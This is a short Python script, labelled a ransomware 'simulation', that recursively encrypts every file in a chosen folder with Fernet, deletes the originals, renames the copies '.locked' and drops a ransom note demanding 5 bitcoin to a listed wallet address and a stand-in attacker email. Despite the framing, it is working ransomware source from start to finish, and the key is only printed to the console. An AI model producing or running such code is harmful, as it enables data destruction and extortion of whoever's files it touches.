import os
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    # Rename file to include a realistic extension
    encrypted_path = file_path + '.locked'  # You can change '.locked' to '.enc' or '.cry'
    with open(encrypted_path, 'wb') as file:
        file.write(encrypted)

    os.remove(file_path)

def drop_ransom_note(folder, key):
    note = f"""
    💀 Your files have been encrypted! 💀

    🔐 If you want the Decryption Key 
    
        Pay 5 Bit Coin To Us
        
        Bit coin Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

    To get your files back, contact: attacker@example.com
    """
    ransom_note_path = os.path.join(folder, "READ_ME_NOW.txt")
    with open(ransom_note_path, 'w', encoding='utf-8') as f:  # ✅ Specify UTF-8
        f.write(note.strip())


    

def simulate_attack(folder):
    key = generate_key()
    print("\n🔐 Ransomware key (save this to decrypt!):", key.decode())

    for root, _, files in os.walk(folder):
        for name in files:
            path = os.path.join(root, name)
            # Avoid encrypting already encrypted files or the ransom note
            if path.endswith('.locked') or 'readme.txt' in path:
                continue
            try:
                encrypt_file(path, key)
            except Exception as e:
                print(f"[!] Skipped: {path} | Reason: {e}")
                continue

    drop_ransom_note(folder, key)

if __name__ == "__main__":
    folder = input("📁 Enter folder to simulate ransomware attack: ").strip('"')
    if os.path.exists(folder) and os.path.isdir(folder):
        simulate_attack(folder)
    else:
        print("❌ Invalid folder path.")
